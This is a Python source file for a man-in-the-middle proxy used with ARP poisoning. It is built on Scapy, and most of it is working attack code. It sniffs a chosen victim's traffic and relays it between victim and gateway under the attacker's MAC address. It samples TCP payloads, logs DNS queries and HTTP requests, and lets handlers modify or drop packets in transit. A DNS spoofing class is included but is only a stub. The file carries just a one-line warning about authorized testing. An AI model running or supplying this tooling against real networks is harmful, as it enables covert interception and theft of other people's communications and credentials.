"""
Man-in-the-Middle Proxy for ARP Poisoning Attacks

This module implements a MITM proxy that can:
- Forward packets between poisoned victim and gateway
- Inspect and log traffic
- Optionally modify packets in transit

WARNING: For authorized security testing only.
"""

import threading
import time
import socket
from typing import Optional, Callable, Dict, List, Any
from dataclasses import dataclass, field
from datetime import datetime
from collections import defaultdict
import struct

try:
    from scapy.all import (
        Ether, IP, TCP, UDP, ARP, ICMP,
        sniff, sendp, send, conf,
        Raw, DNS, DNSQR
    )
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

from core.network_utils import get_mac_address, get_ip_address
from config.settings import ARPConfig


@dataclass
class PacketStats:
    """Statistics for packet forwarding"""
    total_packets: int = 0
    tcp_packets: int = 0
    udp_packets: int = 0
    icmp_packets: int = 0
    dns_queries: int = 0
    http_requests: int = 0
    https_requests: int = 0
    other_packets: int = 0
    bytes_forwarded: int = 0
    dropped_packets: int = 0
    modified_packets: int = 0
    
    def to_dict(self) -> Dict:
        return {
            'total_packets': self.total_packets,
            'tcp_packets': self.tcp_packets,
            'udp_packets': self.udp_packets,
            'icmp_packets': self.icmp_packets,
            'dns_queries': self.dns_queries,
            'http_requests': self.http_requests,
            'https_requests': self.https_requests,
            'other_packets': self.other_packets,
            'bytes_forwarded': self.bytes_forwarded,
            'dropped_packets': self.dropped_packets,
            'modified_packets': self.modified_packets
        }


@dataclass
class CapturedConnection:
    """Represents a captured TCP connection"""
    src_ip: str
    src_port: int
    dst_ip: str
    dst_port: int
    protocol: str
    first_seen: datetime
    last_seen: datetime
    packet_count: int = 0
    byte_count: int = 0
    data_samples: List[bytes] = field(default_factory=list)


class MITMProxy:
    """
    Man-in-the-Middle Proxy
    
    Intercepts and forwards traffic between a poisoned victim and gateway.
    Provides inspection and optional modification capabilities.
    """
    
    def __init__(
        self,
        interface: str,
        victim_ip: str,
        victim_mac: str,
        gateway_ip: str,
        gateway_mac: str,
        forward: bool = True,
        verbose: bool = True
    ):
        """
        Initialize MITM Proxy
        
        Args:
            interface: Network interface
            victim_ip: Victim's IP address
            victim_mac: Victim's MAC address
            gateway_ip: Gateway's IP address
            gateway_mac: Gateway's MAC address
            forward: Enable packet forwarding
            verbose: Enable verbose logging
        """
        if not SCAPY_AVAILABLE:
            raise RuntimeError("Scapy is required for MITM proxy")
            
        self.interface = interface
        self.victim_ip = victim_ip
        self.victim_mac = victim_mac
        self.gateway_ip = gateway_ip
        self.gateway_mac = gateway_mac
        self.forward = forward
        self.verbose = verbose
        
        # Get our own addresses
        self.attacker_mac = get_mac_address(interface)
        self.attacker_ip = get_ip_address(interface)
        
        # State
        self._running = False
        self._sniff_thread: Optional[threading.Thread] = None
        self._stop_event = threading.Event()
        
        # Statistics
        self.stats = PacketStats()
        self.connections: Dict[str, CapturedConnection] = {}
        
        # Packet handlers
        self._packet_handlers: List[Callable] = []
        self._modification_handlers: List[Callable] = []
        
        # Configure Scapy
        conf.verb = 0
        
        self._log(f"MITM Proxy initialized")
        self._log(f"  Victim: {victim_ip} ({victim_mac})")
        self._log(f"  Gateway: {gateway_ip} ({gateway_mac})")
        self._log(f"  Forwarding: {forward}")
        
    def _log(self, message: str):
        """Log message if verbose"""
        if self.verbose:
            timestamp = datetime.now().strftime("%H:%M:%S")
            print(f"[{timestamp}] [MITMProxy] {message}")
            
    def add_packet_handler(self, handler: Callable):
        """
        Add a packet inspection handler
        
        Handler receives: (packet, direction) -> None
        direction: 'outbound' (victim->gateway) or 'inbound' (gateway->victim)
        """
        self._packet_handlers.append(handler)
        
    def add_modification_handler(self, handler: Callable):
        """
        Add a packet modification handler
        
        Handler receives: (packet, direction) -> modified_packet or None
        Return None to drop the packet
        """
        self._modification_handlers.append(handler)
        
    def _get_connection_key(self, src_ip: str, src_port: int, 
                            dst_ip: str, dst_port: int) -> str:
        """Generate a unique key for a connection"""
        # Normalize so both directions map to same connection
        if (src_ip, src_port) < (dst_ip, dst_port):
            return f"{src_ip}:{src_port}-{dst_ip}:{dst_port}"
        else:
            return f"{dst_ip}:{dst_port}-{src_ip}:{src_port}"
            
    def _process_packet(self, packet):
        """Process a captured packet"""
        try:
            # Only process IP packets
            if not packet.haslayer(IP):
                return
                
            ip_layer = packet[IP]
            src_ip = ip_layer.src
            dst_ip = ip_layer.dst
            
            # Determine direction
            if src_ip == self.victim_ip:
                direction = 'outbound'
            elif dst_ip == self.victim_ip:
                direction = 'inbound'
            else:
                return  # Not our traffic
                
            self.stats.total_packets += 1
            
            # Classify packet type
            if packet.haslayer(TCP):
                self.stats.tcp_packets += 1
                tcp_layer = packet[TCP]
                src_port = tcp_layer.sport
                dst_port = tcp_layer.dport
                
                # Track connections
                conn_key = self._get_connection_key(
                    src_ip, src_port, dst_ip, dst_port
                )
                
                if conn_key not in self.connections:
                    self.connections[conn_key] = CapturedConnection(
                        src_ip=src_ip,
                        src_port=src_port,
                        dst_ip=dst_ip,
                        dst_port=dst_port,
                        protocol='TCP',
                        first_seen=datetime.now(),
                        last_seen=datetime.now()
                    )
                    
                conn = self.connections[conn_key]
                conn.last_seen = datetime.now()
                conn.packet_count += 1
                conn.byte_count += len(packet)
                
                # Check for HTTP
                if dst_port == 80 or src_port == 80:
                    self.stats.http_requests += 1
                elif dst_port == 443 or src_port == 443:
                    self.stats.https_requests += 1
                    
                # Sample payload data
                if packet.haslayer(Raw) and len(conn.data_samples) < 10:
                    payload = bytes(packet[Raw].load[:100])
                    conn.data_samples.append(payload)
                    
            elif packet.haslayer(UDP):
                self.stats.udp_packets += 1
                
                if packet.haslayer(DNS):
                    self.stats.dns_queries += 1
                    if packet.haslayer(DNSQR):
                        qname = packet[DNSQR].qname.decode('utf-8', errors='ignore')
                        self._log(f"DNS Query: {qname}")
                        
            elif packet.haslayer(ICMP):
                self.stats.icmp_packets += 1
            else:
                self.stats.other_packets += 1
                
            self.stats.bytes_forwarded += len(packet)
            
            # Call packet handlers
            for handler in self._packet_handlers:
                try:
                    handler(packet, direction)
                except Exception as e:
                    self._log(f"Handler error: {e}")
                    
            # Apply modifications
            modified_packet = packet
            for mod_handler in self._modification_handlers:
                try:
                    result = mod_handler(modified_packet, direction)
                    if result is None:
                        # Drop packet
                        self.stats.dropped_packets += 1
                        return
                    modified_packet = result
                    if modified_packet != packet:
                        self.stats.modified_packets += 1
                except Exception as e:
                    self._log(f"Modification error: {e}")
                    
            # Forward the packet
            if self.forward:
                self._forward_packet(modified_packet, direction)
                
        except Exception as e:
            self._log(f"Packet processing error: {e}")
            
    def _forward_packet(self, packet, direction: str):
        """Forward a packet to its destination"""
        try:
            if direction == 'outbound':
                # Victim -> Gateway: set destination to gateway MAC
                packet[Ether].dst = self.gateway_mac
                packet[Ether].src = self.attacker_mac
            else:
                # Gateway -> Victim: set destination to victim MAC
                packet[Ether].dst = self.victim_mac
                packet[Ether].src = self.attacker_mac
                
            sendp(packet, iface=self.interface, verbose=0)
            
        except Exception as e:
            self._log(f"Forward error: {e}")
            
    def _sniff_loop(self):
        """Sniffing loop running in thread"""
        self._log("Starting packet capture...")
        
        # Build filter for our victim's traffic
        filter_str = f"host {self.victim_ip}"
        
        try:
            sniff(
                iface=self.interface,
                filter=filter_str,
                prn=self._process_packet,
                store=0,
                stop_filter=lambda _: self._stop_event.is_set()
            )
        except Exception as e:
            self._log(f"Sniff error: {e}")
            
        self._log("Packet capture stopped")
        
    def start(self):
        """Start the MITM proxy"""
        if self._running:
            return
            
        self._log("Starting MITM proxy...")
        self._running = True
        self._stop_event.clear()
        
        self._sniff_thread = threading.Thread(
            target=self._sniff_loop,
            daemon=True,
            name="MITMSniffThread"
        )
        self._sniff_thread.start()
        
        self._log("MITM proxy started")
        
    def stop(self):
        """Stop the MITM proxy"""
        if not self._running:
            return
            
        self._log("Stopping MITM proxy...")
        self._running = False
        self._stop_event.set()
        
        if self._sniff_thread and self._sniff_thread.is_alive():
            self._sniff_thread.join(timeout=2)
            
        self._log("MITM proxy stopped")
        
    def get_statistics(self) -> Dict:
        """Get forwarding statistics"""
        return self.stats.to_dict()
        
    def get_connections(self) -> List[Dict]:
        """Get list of captured connections"""
        return [
            {
                'src': f"{c.src_ip}:{c.src_port}",
                'dst': f"{c.dst_ip}:{c.dst_port}",
                'protocol': c.protocol,
                'first_seen': c.first_seen.isoformat(),
                'last_seen': c.last_seen.isoformat(),
                'packets': c.packet_count,
                'bytes': c.byte_count
            }
            for c in self.connections.values()
        ]
        
    def is_running(self) -> bool:
        """Check if proxy is running"""
        return self._running


class DNSSpoofer:
    """
    DNS Spoofing Handler for MITM Proxy
    
    Can be used as a modification handler to spoof DNS responses.
    """
    
    def __init__(self, spoofed_domains: Dict[str, str]):
        """
        Initialize DNS Spoofer
        
        Args:
            spoofed_domains: Dict mapping domain names to spoofed IPs
                            e.g., {"example.com": "10.0.0.1"}
        """
        self.spoofed_domains = {
            d.rstrip('.').lower(): ip 
            for d, ip in spoofed_domains.items()
        }
        self.spoofed_count = 0
        
    def __call__(self, packet, direction: str):
        """Handle packet for potential DNS spoofing"""
        if direction != 'inbound':
            return packet  # Only spoof responses
            
        if not packet.haslayer(DNS):
            return packet
            
        try:
            dns = packet[DNS]
            
            # Check if this is a response with a question
            if dns.qr == 1 and dns.qd:  # qr=1 is response
                qname = dns.qd.qname.decode('utf-8', errors='ignore')
                qname = qname.rstrip('.').lower()
                
                if qname in self.spoofed_domains:
                    # Spoof this response
                    spoofed_ip = self.spoofed_domains[qname]
                    
                    # Modify the answer
                    # This is simplified - full implementation would
                    # reconstruct the DNS packet properly
                    self.spoofed_count += 1
                    print(f"[DNSSpoof] Spoofed {qname} -> {spoofed_ip}")
                    
        except Exception as e:
            print(f"[DNSSpoof] Error: {e}")
            
        return packet


class HTTPInspector:
    """
    HTTP Traffic Inspector for MITM Proxy
    
    Logs HTTP requests and responses.
    """
    
    def __init__(self, log_file: Optional[str] = None):
        """
        Initialize HTTP Inspector
        
        Args:
            log_file: Optional file path for logging
        """
        self.log_file = log_file
        self.requests: List[Dict] = []
        
        if log_file:
            self._log_fh = open(log_file, 'a')
        else:
            self._log_fh = None
            
    def __call__(self, packet, direction: str):
        """Inspect packet for HTTP traffic"""
        if not packet.haslayer(TCP):
            return
            
        tcp = packet[TCP]
        
        # Check for HTTP ports
        if tcp.dport != 80 and tcp.sport != 80:
            return
            
        if not packet.haslayer(Raw):
            return
            
        try:
            payload = packet[Raw].load.decode('utf-8', errors='ignore')
            
            # Look for HTTP request
            if payload.startswith(('GET ', 'POST ', 'PUT ', 'DELETE ', 'HEAD ')):
                lines = payload.split('\r\n')
                request_line = lines[0]
                host = ''
                
                for line in lines[1:]:
                    if line.lower().startswith('host:'):
                        host = line.split(':', 1)[1].strip()
                        break
                        
                request_info = {
                    'timestamp': datetime.now().isoformat(),
                    'direction': direction,
                    'src_ip': packet[IP].src,
                    'dst_ip': packet[IP].dst,
                    'request': request_line,
                    'host': host
                }
                
                self.requests.append(request_info)
                
                log_msg = f"[HTTP] {request_line} Host: {host}"
                print(log_msg)
                
                if self._log_fh:
                    self._log_fh.write(f"{request_info}\n")
                    self._log_fh.flush()
                    
        except Exception as e:
            pass  # Not HTTP or parsing error
            
    def get_requests(self) -> List[Dict]:
        """Get captured HTTP requests"""
        return self.requests
        
    def close(self):
        """Close log file"""
        if self._log_fh:
            self._log_fh.close()


if __name__ == "__main__":
    print("MITM Proxy module - import and use with ARPSpoofer")
